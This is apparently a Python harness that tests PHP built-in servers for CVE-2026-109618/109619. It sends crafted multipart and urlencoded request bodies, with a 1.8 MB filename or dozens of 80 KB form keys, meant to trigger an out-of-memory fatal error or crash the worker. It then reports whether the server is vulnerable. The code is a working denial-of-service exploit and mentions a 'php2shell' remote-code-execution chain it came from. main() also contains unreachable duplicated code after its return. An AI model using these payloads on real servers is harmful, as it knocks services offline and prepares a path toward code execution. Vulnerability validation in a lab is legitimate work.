#!/usr/bin/env python3
'''Windows (x64) crash-validation harness for CVE-2026-109618/109619.

Mirrors the arm64 lab R1 proof on the PHP built-in server:
  1. control multipart request -> baseline (server alive, body length)
  2. classic arm probe (oversized multipart filename) -> expect in-band
     PHP fatal 'Allowed memory size ... exhausted ... in Unknown on line 0'
     or worker death (connection refused on follow-up)
Emits results JSON to --out.
'''
import argparse, json, socket, sys, time
from datetime import datetime, timezone

def http_post(host, port, body, boundary, timeout=60, ctype=None):
    ct = ctype or f"multipart/form-data; boundary={boundary}"
    hdr = (
        f"POST / HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Content-Type: {ct}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode()
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(hdr)
        s.sendall(body)
        chunks = []
        try:
            while True:
                d = s.recv(65536)
                if not d:
                    break
                chunks.append(d)
        except socket.timeout:
            return {"error": "read timeout"}
        except OSError as exc:
            return {"error": f"read: {exc}"}
    raw = b"".join(chunks)
    head, _, body_resp = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    toks = lines[0].split() if lines else []
    status = int(toks[1]) if len(toks) > 1 and toks[1].isdigit() else None
    return {"status": status, "body_len": len(body_resp), "resp": raw[:4096].decode('latin-1', 'replace')}

def build_arm(size_bytes):
    """Multipart body: single part whose filename is huge -> rfc1867
    filename buffer grows before RINIT memory accounting -> OOM fatal."""
    name = b"a" * size_bytes
    part = b"--x\r\nContent-Disposition: name=a; filename=\"" + name + b"\"\r\n\r\n"
    return part + b"data\r\n--x--\r\n"


def build_a1(nkeys=60, keylen=79984):
    """urlencoded OOM arm (CVE-2026-109618 shape, validation-only):
    mbop_decode processes a[] form keys whose 80KB names are allocated
    before the request memory accounting catches up -> pre-RINIT OOM.
    Mirrors the arm64 lab chain-B body (rce_local.build_body) minus payload."""
    out = b"memshift=" + b"M" * 40000 + b"&"
    half = nkeys // 2
    for i in range(half):
        out += b"a[" + (b"X" * keylen + b"%016d" % i) + b"][c]=v&"
    out += b"pad=x&"
    for i in range(half, nkeys):
        out += b"a[" + (b"X" * keylen + b"%016d" % i) + b"][c]=v&"
    return out[:-1]

def control_body():
    return b"--x\r\nContent-Disposition: name=a; filename=\"c\"\r\n\r\ndata\r\n--x--\r\n"

def alive(host, port):
    try:
        r = http_post(host, port, control_body(), "x", timeout=20)
        return r.get("status") is not None
    except OSError:
        return False

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=8080)
    ap.add_argument('--arm-bytes', type=int, default=1_800_000)
    ap.add_argument('--php', required=True)
    ap.add_argument('--out', required=True)
    args = ap.parse_args()
    res = {
        'php': args.php, 'host': args.host, 'port': args.port,
        'arm_bytes': args.arm_bytes, 'timestamp': datetime.now(timezone.utc).isoformat(),
        'control': None, 'probe': None, 'post_probe_alive': None,
        'oom_in_band': False, 'worker_died': False, 'verdict': 'ERROR', 'notes': []}
    c = http_post(args.host, args.port, control_body(), 'x')
    res['control'] = c
    if c.get('status') is None:
        res['verdict'] = 'ERROR'; res['notes'].append('control failed: ' + str(c))
        json.dump(res, open(args.out, 'w'), indent=2); print(json.dumps(res)); return 2
    res['notes'].append(f"control HTTP {c['status']} {c['body_len']}B")
    arms = {}
    for name, body, ctype in (
        ('classic', build_arm(args.arm_bytes), 'multipart'),
        ('a1', build_a1(), 'urlencoded'),
    ):
        if not alive(args.host, args.port):
            res['notes'].append(f'arm {name}: server already dead, skipping')
            arms[name] = {'skipped': 'server dead'}
            continue
        p = http_post(args.host, args.port, body, 'x', ctype=('application/x-www-form-urlencoded' if ctype == 'urlencoded' else None))
        arms[name] = p
        oom = 'Allowed memory size of ' in (p.get('resp') or '') and 'exhausted' in (p.get('resp') or '')
        res['notes'].append(
            f"arm {name} ({ctype} {len(body)}B): "
            + str({k: p.get(k) for k in ('status', 'body_len', 'error')})
            + (' OOM-in-band' if oom else ''))
        time.sleep(0.5)
        if not alive(args.host, args.port):
            res['worker_died'] = True
            res['notes'].append(f'arm {name}: worker died; remaining arms skipped')
            break
    p = arms.get('classic') or arms.get('a1') or {}
    res['probe'] = p
    res['arms'] = arms
    res['oom_in_band'] = any(
        'Allowed memory size of ' in (a.get('resp') or '') and 'exhausted' in (a.get('resp') or '')
        for a in arms.values() if a)
    if not res['worker_died']:
        res['post_probe_alive'] = alive(args.host, args.port)
        res['worker_died'] = not res['post_probe_alive']
    else:
        res['post_probe_alive'] = False
    if res['oom_in_band']:
        res['verdict'] = 'VULNERABLE_OOM_IN_BAND'
        res['notes'].append('pre-RINIT OOM fatal surfaced in-band (php2shell R1 signal)')
    elif res['worker_died']:
        res['verdict'] = 'VULNERABLE_WORKER_DEATH'
        res['notes'].append('worker died during arm parse; follow-up refused')
    elif any((a.get('status') in (500, 502, 503) and not (a.get('body_len') or 0)) for a in arms.values() if a):
        res['verdict'] = 'LIKELY_VULNERABLE'
        res['notes'].append('empty-body 5xx after arm; SAPI-specific death')
    else:
        res['verdict'] = 'NO_SIGNAL'
        res['notes'].append('no crash signal; memory_limit likely > arm budget')
    json.dump(res, open(args.out, 'w'), indent=2)
    print(json.dumps(res, indent=2))
    return 0 if res['verdict'] != 'ERROR' else 2
    oom_marker = 'Allowed memory size of ' in (p.get('resp') or '') and 'exhausted' in (p.get('resp') or '')
    res['oom_in_band'] = bool(oom_marker)
    res['notes'].append('probe: ' + str({k: p.get(k) for k in ('status', 'body_len', 'error')}))
    time.sleep(1.0)
    res['post_probe_alive'] = alive(args.host, args.port)
    res['worker_died'] = not res['post_probe_alive']
    if res['oom_in_band']:
        res['verdict'] = 'VULNERABLE_OOM_IN_BAND'
        res['notes'].append('pre-RINIT OOM fatal surfaced in-band (php2shell R1 signal)')
    elif res['worker_died']:
        res['verdict'] = 'VULNERABLE_WORKER_DEATH'
        res['notes'].append('worker died during arm parse; follow-up refused')
    elif p.get('status') in (500, 502, 503) and (p.get('body_len') or 0) == 0:
        res['verdict'] = 'LIKELY_VULNERABLE'
        res['notes'].append('empty-body 5xx after arm; SAPI-specific death')
    else:
        res['verdict'] = 'NO_SIGNAL'
        res['notes'].append('no crash signal; memory_limit likely > arm budget')
    json.dump(res, open(args.out, 'w'), indent=2)
    print(json.dumps(res, indent=2))
    return 0 if res['verdict'] != 'ERROR' else 2

if __name__ == '__main__':
    sys.exit(main())
